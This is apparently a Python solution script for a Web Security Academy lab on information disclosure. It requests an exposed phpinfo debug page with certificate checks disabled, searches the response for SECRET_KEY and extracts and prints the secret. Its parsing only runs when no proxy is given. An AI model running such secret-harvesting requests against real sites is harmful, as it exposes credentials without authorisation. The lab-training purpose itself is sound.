#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import re
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Information Disclosure Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net/cgi-bin/phpinfo.php" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net/cgi-bin/phpinfo.php" 

Information disclosure on debug page solution: /cgi-bin/phpinfo.php (found from source code comment)
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

url = args.url

def info_disclosure(url):
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        req = requests.get(url, verify=False, proxies=proxies)
    else:
        req = requests.get(url, verify=False)
        # verify the response contains SECRET_KEY
        for line in req.content.splitlines():
            if (b'SECRET_KEY' in line):
                print("The SECRET_KEY is: ")
                s = line.decode("utf-8")
                res = re.search(r'\b[0-9a-z]{32}\b', s)
                print(res.group())
                print("(+) Information Disclosure Successful!")
                break
        if (b'SECRET_KEY' not in req.content):
            print("(-) Information Disclosure Failed")
        else: 
            pass

def main():
    
    print("(+) Exploiting Information Disclosure")
        
    info_disclosure(url)

if __name__ == "__main__":
    main()
